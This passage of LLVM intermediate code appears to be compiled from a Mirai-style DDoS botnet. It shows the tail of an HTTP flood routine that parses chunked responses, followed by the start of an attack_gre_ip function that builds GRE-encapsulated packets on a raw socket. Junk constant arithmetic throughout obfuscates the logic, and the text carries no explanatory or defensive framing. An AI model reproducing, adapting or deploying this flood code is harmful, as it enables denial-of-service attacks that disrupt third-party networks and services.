  %2445 = load i32, i32* %60, align 4
  %2446 = add i32 %2444, 1785285243
  %2447 = sub i32 %2446, %2445
  %2448 = sub i32 %2447, 1785285243
  %2449 = sub nsw i32 %2444, %2445
  %2450 = call i32 @util_memsearch(i8* %2441, i32 %2448, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2450, i32* %61, align 4
  %2451 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2452 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2451, i32 0, i32 18
  %2453 = load i32, i32* %60, align 4
  %2454 = load i32, i32* %61, align 4
  %2455 = sub i32 %2454, -77397121
  %2456 = sub i32 %2455, 1
  %2457 = add i32 %2456, -77397121
  %2458 = sub nsw i32 %2454, 1
  %2459 = sub i32 %2453, 1050541047
  %2460 = add i32 %2459, %2457
  %2461 = add i32 %2460, 1050541047
  %2462 = add nsw i32 %2453, %2457
  %2463 = sext i32 %2461 to i64
  %2464 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2452, i64 0, i64 %2463
  store i8 0, i8* %2464, align 1
  %2465 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2466 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2465, i32 0, i32 15
  %2467 = load i32, i32* %2466, align 4
  %2468 = icmp slt i32 %2467, 5
  br i1 %2468, label %2469, label %2580

; <label>:2469:                                   ; preds = %2428
  %2470 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2471 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2470, i32 0, i32 18
  %2472 = load i32, i32* %60, align 4
  %2473 = sext i32 %2472 to i64
  %2474 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2471, i64 0, i64 %2473
  %2475 = call i32 @util_strlen(i8* %2474)
  %2476 = icmp slt i32 %2475, 128
  br i1 %2476, label %2477, label %2580

; <label>:2477:                                   ; preds = %2469
  %2478 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2479 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2478, i32 0, i32 16
  %2480 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2481 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2480, i32 0, i32 15
  %2482 = load i32, i32* %2481, align 4
  %2483 = sext i32 %2482 to i64
  %2484 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2479, i64 0, i64 %2483
  %2485 = getelementptr inbounds [128 x i8], [128 x i8]* %2484, i32 0, i32 0
  %2486 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2487 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2486, i32 0, i32 18
  %2488 = load i32, i32* %60, align 4
  %2489 = sext i32 %2488 to i64
  %2490 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2487, i64 0, i64 %2489
  %2491 = call i32 @util_strcpy(i8* %2485, i8* %2490)
  %2492 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2493 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2492, i32 0, i32 16
  %2494 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2495 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2494, i32 0, i32 15
  %2496 = load i32, i32* %2495, align 4
  %2497 = sext i32 %2496 to i64
  %2498 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2493, i64 0, i64 %2497
  %2499 = getelementptr inbounds [128 x i8], [128 x i8]* %2498, i32 0, i32 0
  %2500 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2501 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2500, i32 0, i32 16
  %2502 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2503 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2502, i32 0, i32 15
  %2504 = load i32, i32* %2503, align 4
  %2505 = sext i32 %2504 to i64
  %2506 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2501, i64 0, i64 %2505
  %2507 = getelementptr inbounds [128 x i8], [128 x i8]* %2506, i32 0, i32 0
  %2508 = call i32 @util_strlen(i8* %2507)
  %2509 = sext i32 %2508 to i64
  %2510 = getelementptr inbounds i8, i8* %2499, i64 %2509
  %2511 = call i32 @util_strcpy(i8* %2510, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.14, i32 0, i32 0))
  %2512 = load i32, i32* %61, align 4
  %2513 = sub i32 0, 3
  %2514 = sub i32 %2512, %2513
  %2515 = add nsw i32 %2512, 3
  %2516 = load i32, i32* %60, align 4
  %2517 = add i32 %2516, 886592235
  %2518 = add i32 %2517, %2514
  %2519 = sub i32 %2518, 886592235
  %2520 = add nsw i32 %2516, %2514
  store i32 %2519, i32* %60, align 4
  %2521 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2522 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2521, i32 0, i32 18
  %2523 = load i32, i32* %60, align 4
  %2524 = sext i32 %2523 to i64
  %2525 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2522, i64 0, i64 %2524
  %2526 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2527 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2526, i32 0, i32 17
  %2528 = load i32, i32* %2527, align 4
  %2529 = load i32, i32* %60, align 4
  %2530 = add i32 %2528, 1529009457
  %2531 = sub i32 %2530, %2529
  %2532 = sub i32 %2531, 1529009457
  %2533 = sub nsw i32 %2528, %2529
  %2534 = call i32 @util_memsearch(i8* %2525, i32 %2532, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.13, i32 0, i32 0), i32 1)
  store i32 %2534, i32* %61, align 4
  %2535 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2536 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2535, i32 0, i32 18
  %2537 = load i32, i32* %60, align 4
  %2538 = load i32, i32* %61, align 4
  %2539 = sub i32 0, 1
  %2540 = add i32 %2538, %2539
  %2541 = sub nsw i32 %2538, 1
  %2542 = add i32 %2537, -1275090961
  %2543 = add i32 %2542, %2540
  %2544 = sub i32 %2543, -1275090961
  %2545 = add nsw i32 %2537, %2540
  %2546 = sext i32 %2544 to i64
  %2547 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2536, i64 0, i64 %2546
  store i8 0, i8* %2547, align 1
  %2548 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2549 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2548, i32 0, i32 16
  %2550 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2551 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2550, i32 0, i32 15
  %2552 = load i32, i32* %2551, align 4
  %2553 = sext i32 %2552 to i64
  %2554 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2549, i64 0, i64 %2553
  %2555 = getelementptr inbounds [128 x i8], [128 x i8]* %2554, i32 0, i32 0
  %2556 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2557 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2556, i32 0, i32 16
  %2558 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2559 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2558, i32 0, i32 15
  %2560 = load i32, i32* %2559, align 4
  %2561 = sext i32 %2560 to i64
  %2562 = getelementptr inbounds [5 x [128 x i8]], [5 x [128 x i8]]* %2557, i64 0, i64 %2561
  %2563 = getelementptr inbounds [128 x i8], [128 x i8]* %2562, i32 0, i32 0
  %2564 = call i32 @util_strlen(i8* %2563)
  %2565 = sext i32 %2564 to i64
  %2566 = getelementptr inbounds i8, i8* %2555, i64 %2565
  %2567 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2568 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2567, i32 0, i32 18
  %2569 = load i32, i32* %60, align 4
  %2570 = sext i32 %2569 to i64
  %2571 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2568, i64 0, i64 %2570
  %2572 = call i32 @util_strcpy(i8* %2566, i8* %2571)
  %2573 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2574 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2573, i32 0, i32 15
  %2575 = load i32, i32* %2574, align 4
  %2576 = sub i32 %2575, 198892249
  %2577 = add i32 %2576, 1
  %2578 = add i32 %2577, 198892249
  %2579 = add nsw i32 %2575, 1
  store i32 %2578, i32* %2574, align 4
  br label %2580

; <label>:2580:                                   ; preds = %2477, %2469, %2428
  %2581 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2582 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2581, i32 0, i32 14
  store i32 -1, i32* %2582, align 4
  %2583 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2584 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2583, i32 0, i32 1
  store i8 10, i8* %2584, align 4
  br label %2718

; <label>:2585:                                   ; preds = %2418
  br label %2586

; <label>:2586:                                   ; preds = %2585, %2405
  br label %2587

; <label>:2587:                                   ; preds = %2586, %2384
  %2588 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2589 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2588, i32 0, i32 14
  %2590 = load i32, i32* %2589, align 4
  %2591 = icmp eq i32 %2590, 0
  br i1 %2591, label %2592, label %2678

; <label>:2592:                                   ; preds = %2587
  %2593 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2594 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2593, i32 0, i32 13
  %2595 = load i32, i32* %2594, align 4
  %2596 = icmp eq i32 %2595, 1
  br i1 %2596, label %2597, label %2658

; <label>:2597:                                   ; preds = %2592
  %2598 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2599 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2598, i32 0, i32 18
  %2600 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2599, i32 0, i32 0
  %2601 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2602 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2601, i32 0, i32 17
  %2603 = load i32, i32* %2602, align 4
  %2604 = call i32 @util_memsearch(i8* %2600, i32 %2603, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %2605 = icmp ne i32 %2604, -1
  br i1 %2605, label %2606, label %2657

; <label>:2606:                                   ; preds = %2597
  %2607 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2608 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2607, i32 0, i32 18
  %2609 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2608, i32 0, i32 0
  %2610 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2611 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2610, i32 0, i32 17
  %2612 = load i32, i32* %2611, align 4
  %2613 = call i32 @util_memsearch(i8* %2609, i32 %2612, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %2613, i32* %62, align 4
  %2614 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2615 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2614, i32 0, i32 18
  %2616 = load i32, i32* %62, align 4
  %2617 = sub i32 %2616, 1290116590
  %2618 = sub i32 %2617, 2
  %2619 = add i32 %2618, 1290116590
  %2620 = sub nsw i32 %2616, 2
  %2621 = sext i32 %2619 to i64
  %2622 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2615, i64 0, i64 %2621
  store i8 0, i8* %2622, align 1
  %2623 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2624 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2623, i32 0, i32 18
  %2625 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2624, i32 0, i32 0
  %2626 = load i32, i32* %62, align 4
  %2627 = call i32 @util_memsearch(i8* %2625, i32 %2626, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2628 = icmp ne i32 %2627, -1
  br i1 %2628, label %2629, label %2639

; <label>:2629:                                   ; preds = %2606
  %2630 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2631 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2630, i32 0, i32 18
  %2632 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2633 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2632, i32 0, i32 18
  %2634 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2633, i32 0, i32 0
  %2635 = load i32, i32* %62, align 4
  %2636 = call i32 @util_memsearch(i8* %2634, i32 %2635, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %2637 = sext i32 %2636 to i64
  %2638 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2631, i64 0, i64 %2637
  store i8 0, i8* %2638, align 1
  br label %2639

; <label>:2639:                                   ; preds = %2629, %2606
  %2640 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2641 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2640, i32 0, i32 18
  %2642 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2641, i32 0, i32 0
  %2643 = call i32 @util_atoi(i8* %2642, i32 16)
  store i32 %2643, i32* %63, align 4
  %2644 = load i32, i32* %63, align 4
  %2645 = icmp eq i32 %2644, 0
  br i1 %2645, label %2646, label %2649

; <label>:2646:                                   ; preds = %2639
  %2647 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2648 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2647, i32 0, i32 1
  store i8 1, i8* %2648, align 4
  br label %2718

; <label>:2649:                                   ; preds = %2639
  %2650 = load i32, i32* %63, align 4
  %2651 = sub i32 0, 2
  %2652 = sub i32 %2650, %2651
  %2653 = add nsw i32 %2650, 2
  %2654 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2655 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2654, i32 0, i32 14
  store i32 %2652, i32* %2655, align 4
  %2656 = load i32, i32* %62, align 4
  store i32 %2656, i32* %59, align 4
  br label %2657

; <label>:2657:                                   ; preds = %2649, %2597
  br label %2677

; <label>:2658:                                   ; preds = %2592
  %2659 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2660 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2659, i32 0, i32 17
  %2661 = load i32, i32* %2660, align 4
  %2662 = load i32, i32* %59, align 4
  %2663 = sub i32 %2661, 754834721
  %2664 = sub i32 %2663, %2662
  %2665 = add i32 %2664, 754834721
  %2666 = sub nsw i32 %2661, %2662
  %2667 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2668 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2667, i32 0, i32 14
  store i32 %2665, i32* %2668, align 4
  %2669 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2670 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2669, i32 0, i32 14
  %2671 = load i32, i32* %2670, align 4
  %2672 = icmp eq i32 %2671, 0
  br i1 %2672, label %2673, label %2676

; <label>:2673:                                   ; preds = %2658
  %2674 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2675 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2674, i32 0, i32 1
  store i8 1, i8* %2675, align 4
  br label %2718

; <label>:2676:                                   ; preds = %2658
  br label %2677

; <label>:2677:                                   ; preds = %2676, %2657
  br label %2678

; <label>:2678:                                   ; preds = %2677, %2587
  %2679 = load i32, i32* %59, align 4
  %2680 = icmp eq i32 %2679, 0
  br i1 %2680, label %2681, label %2682

; <label>:2681:                                   ; preds = %2678
  br label %2718

; <label>:2682:                                   ; preds = %2678
  %2683 = load i32, i32* %59, align 4
  %2684 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2685 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2684, i32 0, i32 17
  %2686 = load i32, i32* %2685, align 4
  %2687 = add i32 %2686, 1988400690
  %2688 = sub i32 %2687, %2683
  %2689 = sub i32 %2688, 1988400690
  %2690 = sub nsw i32 %2686, %2683
  store i32 %2689, i32* %2685, align 4
  %2691 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2692 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2691, i32 0, i32 18
  %2693 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2692, i32 0, i32 0
  %2694 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2695 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2694, i32 0, i32 18
  %2696 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2695, i32 0, i32 0
  %2697 = load i32, i32* %59, align 4
  %2698 = sext i32 %2697 to i64
  %2699 = getelementptr inbounds i8, i8* %2696, i64 %2698
  %2700 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2701 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2700, i32 0, i32 17
  %2702 = load i32, i32* %2701, align 4
  %2703 = sext i32 %2702 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %2693, i8* %2699, i64 %2703, i32 1, i1 false)
  %2704 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2705 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2704, i32 0, i32 18
  %2706 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2707 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2706, i32 0, i32 17
  %2708 = load i32, i32* %2707, align 4
  %2709 = sext i32 %2708 to i64
  %2710 = getelementptr inbounds [1024 x i8], [1024 x i8]* %2705, i64 0, i64 %2709
  store i8 0, i8* %2710, align 1
  %2711 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2712 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2711, i32 0, i32 17
  %2713 = load i32, i32* %2712, align 4
  %2714 = icmp eq i32 %2713, 0
  br i1 %2714, label %2715, label %2716

; <label>:2715:                                   ; preds = %2682
  br label %2718

; <label>:2716:                                   ; preds = %2682
  br label %2717

; <label>:2717:                                   ; preds = %2716
  br label %2384

; <label>:2718:                                   ; preds = %2715, %2681, %2673, %2646, %2580
  br label %2297

; <label>:2719:                                   ; preds = %2370, %2303
  br label %2772

; <label>:2720:                                   ; preds = %2290
  %2721 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2722 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2721, i32 0, i32 1
  %2723 = load i8, i8* %2722, align 4
  %2724 = zext i8 %2723 to i32
  %2725 = icmp eq i32 %2724, 10
  br i1 %2725, label %2726, label %2771

; <label>:2726:                                   ; preds = %2720
  br label %2727

; <label>:2727:                                   ; preds = %2760, %2726
  %2728 = call i32* @__errno_location() #7
  store i32 0, i32* %2728, align 4
  %2729 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2730 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2729, i32 0, i32 0
  %2731 = load i32, i32* %2730, align 4
  %2732 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %2733 = call i64 @recv(i32 %2731, i8* %2732, i64 10240, i32 16384)
  %2734 = trunc i64 %2733 to i32
  store i32 %2734, i32* %12, align 4
  %2735 = load i32, i32* %12, align 4
  %2736 = icmp eq i32 %2735, 0
  br i1 %2736, label %2737, label %2739

; <label>:2737:                                   ; preds = %2727
  %2738 = call i32* @__errno_location() #7
  store i32 104, i32* %2738, align 4
  store i32 -1, i32* %12, align 4
  br label %2739

; <label>:2739:                                   ; preds = %2737, %2727
  %2740 = load i32, i32* %12, align 4
  %2741 = icmp eq i32 %2740, -1
  br i1 %2741, label %2742, label %2760

; <label>:2742:                                   ; preds = %2739
  %2743 = call i32* @__errno_location() #7
  %2744 = load i32, i32* %2743, align 4
  %2745 = icmp ne i32 %2744, 11
  br i1 %2745, label %2746, label %2759

; <label>:2746:                                   ; preds = %2742
  %2747 = call i32* @__errno_location() #7
  %2748 = load i32, i32* %2747, align 4
  %2749 = icmp ne i32 %2748, 11
  br i1 %2749, label %2750, label %2759

; <label>:2750:                                   ; preds = %2746
  %2751 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2752 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2751, i32 0, i32 0
  %2753 = load i32, i32* %2752, align 4
  %2754 = call i32 @close(i32 %2753)
  %2755 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2756 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2755, i32 0, i32 0
  store i32 -1, i32* %2756, align 4
  %2757 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2758 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2757, i32 0, i32 1
  store i8 0, i8* %2758, align 4
  br label %2759

; <label>:2759:                                   ; preds = %2750, %2746, %2742
  br label %2761

; <label>:2760:                                   ; preds = %2739
  br label %2727

; <label>:2761:                                   ; preds = %2759
  %2762 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2763 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2762, i32 0, i32 1
  %2764 = load i8, i8* %2763, align 4
  %2765 = zext i8 %2764 to i32
  %2766 = icmp ne i32 %2765, 0
  br i1 %2766, label %2767, label %2770

; <label>:2767:                                   ; preds = %2761
  %2768 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %2769 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %2768, i32 0, i32 1
  store i8 1, i8* %2769, align 4
  br label %2770

; <label>:2770:                                   ; preds = %2767, %2761
  br label %2771

; <label>:2771:                                   ; preds = %2770, %2720
  br label %2772

; <label>:2772:                                   ; preds = %2771, %2719
  br label %2773

; <label>:2773:                                   ; preds = %2772, %2281
  br label %2774

; <label>:2774:                                   ; preds = %2773, %1108
  br label %2775

; <label>:2775:                                   ; preds = %2774, %2241, %1846, %1164, %1147, %1098, %1063
  %2776 = load i32, i32* %9, align 4
  %2777 = add i32 %2776, -1106477442
  %2778 = add i32 %2777, 1
  %2779 = sub i32 %2778, -1106477442
  %2780 = add nsw i32 %2776, 1
  store i32 %2779, i32* %9, align 4
  br label %1050

; <label>:2781:                                   ; preds = %1050
  br label %362

; <label>:2782:                                   ; preds = %104, %99, %94, %89
  ret void
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memmove.p0i8.p0i8.i64(i8* nocapture, i8* nocapture readonly, i64, i32, i1) #4

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

; Function Attrs: nounwind
declare i64 @time(i64*) #1

declare i32 @close(i32) #5

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

declare i32 @fcntl(i32, i32, ...) #5

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

declare i32 @connect(i32, %struct.sockaddr*, i32) #5

declare i64 @send(i32, i8*, i64, i32) #5

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #5

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #1

declare i64 @recv(i32, i8*, i64, i32) #5

declare i32 @sleep(i32) #5

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #1

; Function Attrs: noinline nounwind uwtable
define void @attack_gre_ip(i32, i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %6 = alloca i32, align 4
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_target*, align 8
  %9 = alloca i8, align 1
  %10 = alloca %struct.attack_option*, align 8
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i8**, align 8
  %14 = alloca i8, align 1
  %15 = alloca i16, align 2
  %16 = alloca i8, align 1
  %17 = alloca i8, align 1
  %18 = alloca i16, align 2
  %19 = alloca i16, align 2
  %20 = alloca i32, align 4
  %21 = alloca i8, align 1
  %22 = alloca i8, align 1
  %23 = alloca i32, align 4
  %24 = alloca i32, align 4
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.grehdr*, align 8
  %27 = alloca %struct.iphdr*, align 8
  %28 = alloca %struct.udphdr*, align 8
  %29 = alloca i8*, align 8
  %30 = alloca %struct.iphdr*, align 8
  %31 = alloca %struct.grehdr*, align 8
  %32 = alloca %struct.iphdr*, align 8
  %33 = alloca %struct.udphdr*, align 8
  %34 = alloca i8*, align 8
  %35 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i32 %0, i32* %6, align 4
  store i8 %1, i8* %7, align 1
  store %struct.attack_target* %2, %struct.attack_target** %8, align 8
  store i8 %3, i8* %9, align 1
  store %struct.attack_option* %4, %struct.attack_option** %10, align 8
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  %36 = load i8, i8* %7, align 1
  %37 = zext i8 %36 to i64
  %38 = call noalias i8* @calloc(i64 %37, i64 8) #6
  %39 = bitcast i8* %38 to i8**
  store i8** %39, i8*** %13, align 8
  %40 = load i8, i8* %9, align 1
  %41 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %42 = call i32 @attack_get_opt_int(i8 zeroext %40, %struct.attack_option* %41, i8 zeroext 2, i32 0)
  %43 = trunc i32 %42 to i8
  store i8 %43, i8* %14, align 1
  %44 = load i8, i8* %9, align 1
  %45 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %46 = call i32 @attack_get_opt_int(i8 zeroext %44, %struct.attack_option* %45, i8 zeroext 3, i32 65535)
  %47 = trunc i32 %46 to i16
  store i16 %47, i16* %15, align 2
  %48 = load i8, i8* %9, align 1
  %49 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %50 = call i32 @attack_get_opt_int(i8 zeroext %48, %struct.attack_option* %49, i8 zeroext 4, i32 64)
  %51 = trunc i32 %50 to i8
  store i8 %51, i8* %16, align 1
  %52 = load i8, i8* %9, align 1
  %53 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %54 = call i32 @attack_get_opt_int(i8 zeroext %52, %struct.attack_option* %53, i8 zeroext 5, i32 1)
  %55 = trunc i32 %54 to i8
  store i8 %55, i8* %17, align 1
  %56 = load i8, i8* %9, align 1
  %57 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 6, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %18, align 2
  %60 = load i8, i8* %9, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 7, i32 65535)
  %63 = trunc i32 %62 to i16
  store i16 %63, i16* %19, align 2
  %64 = load i8, i8* %9, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 0, i32 512)
  store i32 %66, i32* %20, align 4
  %67 = load i8, i8* %9, align 1
  %68 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %69 = call i32 @attack_get_opt_int(i8 zeroext %67, %struct.attack_option* %68, i8 zeroext 1, i32 1)
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %21, align 1
  %71 = load i8, i8* %9, align 1
  %72 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %73 = call i32 @attack_get_opt_int(i8 zeroext %71, %struct.attack_option* %72, i8 zeroext 18, i32 0)
  %74 = trunc i32 %73 to i8
  store i8 %74, i8* %22, align 1
  %75 = load i8, i8* %9, align 1
  %76 = load %struct.attack_option*, %struct.attack_option** %10, align 8
  %77 = load i32, i32* @LOCAL_ADDR, align 4
  %78 = call i32 @attack_get_opt_int(i8 zeroext %75, %struct.attack_option* %76, i8 zeroext 24, i32 %77)
  store i32 %78, i32* %23, align 4
  %79 = call i64 @time(i64* null) #6
  %80 = load i32, i32* %6, align 4
  %81 = sext i32 %80 to i64
  %82 = sub i64 %79, 382158784700673727
  %83 = add i64 %82, %81
  %84 = add i64 %83, 382158784700673727
  %85 = add nsw i64 %79, %81
  %86 = trunc i64 %84 to i32
  store i32 %86, i32* %24, align 4
  %87 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %87, i32* %12, align 4
  %88 = icmp eq i32 %87, -1
  br i1 %88, label %89, label %90

; <label>:89:                                     ; preds = %5
  br label %554

; <label>:90:                                     ; preds = %5
  store i32 1, i32* %11, align 4
  %91 = load i32, i32* %12, align 4
  %92 = bitcast i32* %11 to i8*
